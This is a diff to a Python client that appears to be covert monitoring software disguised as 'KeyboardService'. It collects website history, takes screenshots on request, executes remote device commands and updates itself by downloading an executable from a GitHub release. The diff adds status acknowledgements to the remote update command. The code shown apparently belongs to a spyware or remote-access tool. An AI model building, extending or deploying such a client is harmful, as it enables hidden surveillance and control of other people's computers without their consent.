@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.2"
+APP_VERSION = "1.2.1"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1009,7 +1009,7 @@ def handle_device_command(command, command_id=None, message=""):
                 raise RuntimeError("Client updates are only supported on Windows")
             if not getattr(sys, "frozen", False):
                 raise RuntimeError("This client is not running from an installed build and cannot update itself.")
-            check_for_updates()
+            check_for_updates(command_id=command_id)
         elif command == "message":
             if os.name != "nt":
                 raise RuntimeError("Message boxes are only supported on Windows")
@@ -1547,21 +1547,31 @@ def schedule_update(temporary_path, previous_version=None, new_version=None):
     subprocess.Popen(["cmd.exe", "/c", helper_path], close_fds=True, startupinfo=startup_info)
 
 
-def check_for_updates():
+def check_for_updates(command_id=None):
     if os.name != "nt" or not getattr(sys, "frozen", False):
-        return
+        return False
     if not update_lock.acquire(blocking=False):
-        return
+        if command_id:
+            acknowledge_device_command(command_id, "failed", "Another update is already in progress.")
+        return False
     try:
         result = download_update()
         if not result:
-            return
+            if command_id:
+                acknowledge_device_command(command_id, "failed", "No update available.")
+            return False
         temporary_path, latest_tag = result
         print(f"Updating KeyboardService from {APP_VERSION} to {latest_tag}")
+        if command_id:
+            acknowledge_device_command(command_id, "completed")
         schedule_update(temporary_path, previous_version=APP_VERSION, new_version=latest_tag)
         os._exit(0)
+        return True
     except Exception as error:
         print(f"Could not check for KeyboardService updates: {error}")
+        if command_id:
+            acknowledge_device_command(command_id, "failed", str(error))
+        return False
     finally:
         update_lock.release()
 
